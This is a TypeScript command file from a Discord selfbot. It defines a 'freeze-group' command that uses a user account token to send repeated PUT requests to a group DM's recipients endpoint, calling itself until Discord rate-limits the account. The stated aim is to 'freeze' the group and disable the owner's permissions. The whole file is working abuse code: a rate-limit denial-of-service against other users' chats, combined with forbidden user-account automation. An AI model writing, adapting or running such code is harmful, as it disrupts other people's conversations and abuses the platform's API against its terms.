import Command from "@Commands/command";
import Credits from "@Utils/Credits";
import Logs from "@Utils/Logs";

import type { Message } from "discord.js-selfbot-v13";

export default class FreezeGroup extends Command {
	public static metadata = {
		name: "freeze-group",
		parameters: [],
		description: "Freeze a group and disable the owner's permissions.",
		aliases: [],
	};

	constructor(message: Message) {
		super(message, FreezeGroup.metadata);
	}

	async sendGrenades(
		groupId: string
	): Promise<{ success: boolean; retry_after: number }> {
		const response = await fetch(
			`https://discord.com/api/v8/channels/${groupId}/recipients/1337`,
			{
				method: "PUT",
				headers: {
					"accept": "*/*",
					"authorization": Bun.env.TOKEN as string,
					"origin": "https://discord.com",
					"referer": `https://discord.com/channels/@me/${groupId}`,
					"sec-ch-ua": '"Not?A_Brand";v="99", "Chromium";v="130"',
					"user-agent":
						"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9184 Chrome/130.0.6723.191 Electron/33.4.0 Safari/537.36",
				},
			}
		);

		if (response.status === 429) {
			const data = await response.json();

			return {
				success: true,
				retry_after: data.retry_after,
			};
		}

		return await this.sendGrenades(groupId);
	}

	async execute() {
		const channel = this.message.channel;

		if (channel.type !== "GROUP_DM") {
			channel.send(
				Credits.Append("⚠️ This command can only be used in a group.")
			);
			return;
		}

		const status = await this.sendGrenades(channel.id);
		if (status.success) {
			Logs.Success(
				`Successfully froze group for ${status.retry_after}ms.`
			);
			this.message.channel.send(
				Credits.Append(
					`✅ Successfully froze the group for \`${status.retry_after}ms\`.`
				)
			);
		}
	}
}
